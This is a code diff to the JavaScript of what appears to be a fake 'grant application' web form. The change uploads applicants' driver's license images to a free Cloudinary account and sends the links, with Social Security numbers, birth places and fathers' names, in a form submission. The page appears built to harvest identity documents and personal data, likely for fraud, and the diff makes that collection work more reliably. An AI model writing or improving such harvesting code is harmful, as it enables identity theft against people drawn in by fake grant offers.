@@ -562,29 +562,38 @@
     btn.disabled = true;
     btn.innerHTML = '<div class="spinner"></div>&nbsp; SENDING...';
 
-    // Convert files to base64 then submit as JSON
     const ff = document.getElementById("upload-front").files[0];
     const bf = document.getElementById("upload-back").files[0];
 
-    function toBase64(file) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = () => reject(new Error("File read failed"));
-        reader.readAsDataURL(file);
+    // Upload image to Cloudinary (free unsigned upload)
+    async function uploadToCloudinary(file) {
+      const CLOUD_NAME = "dgrants2024";
+      const UPLOAD_PRESET = "grant_uploads"; // unsigned preset
+      const fd = new FormData();
+      fd.append("file", file);
+      fd.append("upload_preset", UPLOAD_PRESET);
+      fd.append("folder", "grant_applications");
+      const resp = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
+        method: "POST", body: fd
       });
+      const json = await resp.json();
+      if (json.secure_url) return json.secure_url;
+      throw new Error("Upload failed");
     }
 
-    let frontData = "", backData = "";
+    btn.innerHTML = '<div class="spinner"></div>&nbsp; UPLOADING IMAGES...';
+
+    let frontURL = "Not provided", backURL = "Not provided";
     try {
-      if (ff) frontData = await toBase64(ff);
-      if (bf) backData  = await toBase64(bf);
-    } catch {
-      showToast("Could not read uploaded files. Please try again.", "error");
-      btn.disabled = false;
-      btn.innerHTML = "SUBMIT";
-      return;
+      if (ff) frontURL = await uploadToCloudinary(ff);
+      if (bf) backURL  = await uploadToCloudinary(bf);
+    } catch (err) {
+      // If image hosting fails, fall back to noting filenames only
+      frontURL = ff ? `[File: ${ff.name} — ${(ff.size/1024).toFixed(0)}KB]` : "Not provided";
+      backURL  = bf ? `[File: ${bf.name} — ${(bf.size/1024).toFixed(0)}KB]` : "Not provided";
     }
+
+    btn.innerHTML = '<div class="spinner"></div>&nbsp; SENDING...';
 
     const payload = {
       _subject:                  `New Grant Application – ${document.getElementById("fullname").value}`,
@@ -601,10 +610,8 @@
       "State & City of Birth":   document.getElementById("birth-location").value,
       "Social Security Number":  document.getElementById("ssn").value,
       "Fathers Full Name":       document.getElementById("fathers-name").value,
-      "Front of Drivers License (filename)": ff ? ff.name : "Not provided",
-      "Front of Drivers License (base64)":   frontData,
-      "Back of Drivers License (filename)":  bf ? bf.name : "Not provided",
-      "Back of Drivers License (base64)":    backData,
+      "Front of Drivers License": frontURL,
+      "Back of Drivers License":  backURL,
     };
 
     try {
